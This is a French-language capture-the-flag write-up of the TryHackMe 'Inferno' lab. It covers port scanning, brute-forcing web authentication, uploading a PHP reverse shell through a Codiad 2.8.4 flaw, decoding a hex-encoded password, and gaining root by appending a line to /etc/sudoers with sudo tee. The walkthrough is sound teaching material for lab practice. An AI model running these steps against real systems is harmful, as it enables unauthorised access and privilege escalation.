# Inferno

![04838068cabd2452b322e06418cce864(1)](https://user-images.githubusercontent.com/68467919/210245790-5a331e70-3a66-4cc5-897d-8a9b5d18fc52.png)

Plateforme: **TryHackme**

Nom: Inferno

Difficulté: **Medium**

Infos: **security**, **rce**, **oscp**, **vulnhub**

---

Énumération

### Nmap

```bash
sudo nmap -sC -sV -O -oN enum/nmap -vv $ip

PORT      STATE SERVICE           REASON         VERSION
21/tcp    open  ftp?              syn-ack ttl 63
22/tcp    open  ssh               syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7ec1a7f6274da2964b3ce1ee26804f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de4feefa862efbbd4cdcf96773028434 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e26d8de1a8d0bd97cb9abc03c3f8d885 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
23/tcp    open  telnet?           syn-ack ttl 63
25/tcp    open  smtp?             syn-ack ttl 63
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Dante's Inferno
88/tcp    open  kerberos-sec?     syn-ack ttl 63
106/tcp   open  pop3pw?           syn-ack ttl 63
110/tcp   open  pop3?             syn-ack ttl 63
389/tcp   open  ldap?             syn-ack ttl 63
443/tcp   open  https?            syn-ack ttl 63
464/tcp   open  kpasswd5?         syn-ack ttl 63
636/tcp   open  ldapssl?          syn-ack ttl 63
777/tcp   open  multiling-http?   syn-ack ttl 63
783/tcp   open  spamassassin?     syn-ack ttl 63
808/tcp   open  ccproxy-http?     syn-ack ttl 63
873/tcp   open  rsync?            syn-ack ttl 63
1001/tcp  open  webpush?          syn-ack ttl 63
1236/tcp  open  bvcontrol?        syn-ack ttl 63
1300/tcp  open  h323hostcallsc?   syn-ack ttl 63
2000/tcp  open  cisco-sccp?       syn-ack ttl 63
2003/tcp  open  finger?           syn-ack ttl 63
2121/tcp  open  ccproxy-ftp?      syn-ack ttl 63
2601/tcp  open  zebra?            syn-ack ttl 63
2602/tcp  open  ripd?             syn-ack ttl 63
2604/tcp  open  ospfd?            syn-ack ttl 63
2605/tcp  open  bgpd?             syn-ack ttl 63
2607/tcp  open  connection?       syn-ack ttl 63
2608/tcp  open  wag-service?      syn-ack ttl 63
4224/tcp  open  xtell?            syn-ack ttl 63
5051/tcp  open  ida-agent?        syn-ack ttl 63
5432/tcp  open  postgresql?       syn-ack ttl 63
5555/tcp  open  freeciv?          syn-ack ttl 63
5666/tcp  open  nrpe?             syn-ack ttl 63
6346/tcp  open  gnutella?         syn-ack ttl 63
6566/tcp  open  sane-port?        syn-ack ttl 63
6667/tcp  open  irc?              syn-ack ttl 63
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?        syn-ack ttl 63
8081/tcp  open  blackice-icecap?  syn-ack ttl 63
|_mcafee-epo-agent: ePO Agent not found
8088/tcp  open  radan-http?       syn-ack ttl 63
9418/tcp  open  git?              syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt? syn-ack ttl 63
10082/tcp open  amandaidx?        syn-ack ttl 63
```

### Feroxbuster

```python
feroxbuster -u http://10.10.30.189/ -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt -o enum/feroxbuster -W 28

200      GET       36l       82w      638c http://10.10.30.189/
401      GET       14l       54w      459c http://10.10.30.189/inferno
403      GET        9l       28w      277c http://10.10.30.189/server-status
```

## Port 80 | HTTP

![Untitled](https://user-images.githubusercontent.com/68467919/210245602-6bd805a2-f5ce-4741-b302-86bb3d33fdb6.png)

### /inferno

Quand nous voulons accéder au répertoire /inferno, nous remarquons que nous devons nous authentifier pour pouvoir accéder à la page. Pour cela, nous pourrions tenter de bruteforce la page d’authentification à l’aide d’Hydra.

![Untitled 1](https://user-images.githubusercontent.com/68467919/210245632-dcbbc020-2f26-4527-b603-0f63333b4291.png)

Nous trouvons le mot de passe en quelques minutes. Désormais, nous pouvons utiliser ces logs pour pouvoir nous connecter. 

![Untitled 2](https://user-images.githubusercontent.com/68467919/210245640-cb914972-1e28-44d9-85a1-1166c861468e.png)

En utilisant les mêmes logs trouvés plus haut, nous accédons à un IDE appelé Codiad nous permettant de pouvoir gérer, voir les fichiers et pouvoir également les updates en temps réel sur le serveur web.

Nous nous retrouvons donc sur cette page : 

![Untitled 3](https://user-images.githubusercontent.com/68467919/210245650-e81bbd19-5f5a-4443-a80c-f94ce7e8d034.png)

Nous voulons obtenir un reverse-shell mais en updatant des fichiers déjà existant ou bien en les uploadant à la racine, il est impossible de faire quoi que ce soit. En cherchant sur internet, voici ce que j’ai pu trouver : 

[Codiad 2.8.4 Shell Upload](https://packetstormsecurity.com/files/164735/Codiad-2.8.4-Shell-Upload.html)

Je suis donc allé dans ce répertoire pour pouvoir upload un reverse-shell en php.

```python
/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/
```

Après avoir upload mon reverse-shell et accédé au répertoire INF, je réussis à me connecter à la machine.

![Untitled 4](https://user-images.githubusercontent.com/68467919/210245665-5987284f-e6b3-4424-aa51-7014b929cf0e.png)

## Dante | local.txt

Après avoir obtenu un reverse-shell et en regardant dans /etc/passwd, nous pouvons remarquer qu’un utilisateur du nom de dante est présent. En énumérant un peu ses fichiers en faisant la commande

```python
ls -la -R /home/dante/ #permet d'énumérer les fichiers récursivement et de voir les droits, owners des différents fichiers
```

Nous pouvons remarquer un fichier du nom de *.download.dat*

![Untitled 5](https://user-images.githubusercontent.com/68467919/210245671-7b9e624f-a6e1-4bf7-97a0-9104b019c851.png)

En le téléchargeant sur ma machine nous pouvons remarquer à l’aide de la commande *file* que le contenu du fichier est en ASCII. En exécutant la commande 

```python
cat .download.dat | xxd -r -p 
```

Nous pouvons retrouver le contenu du fichier qui contient le mot de passe de notre utilisateur *dante*.

![Untitled 6](https://user-images.githubusercontent.com/68467919/210245680-a4727906-177d-4be9-a4f1-c8f6a148c0e1.png)

Nous pouvons trouver le contenu du premier flag dans /home/dante/*local.txt*

## Root | proof.txt

En énumérant les droits de l’utilisateur **dante**, nous pouvons également remarquer qu’il a le droit d’utiliser la commande **tee** en tant que **root**.

J’ai donc pensé à modifier le fichier */etc/sudoers* pour nous attribuer tous les droits en tant que root.

```python
LFILE=/etc/sudoers
echo "dante ALL=(ALL) ALL" | sudo tee -a "$LFILE"
```

![Untitled 7](https://user-images.githubusercontent.com/68467919/210245690-58a30196-01bf-40b4-b364-92ca14bf2db5.png)

ROOTED !!
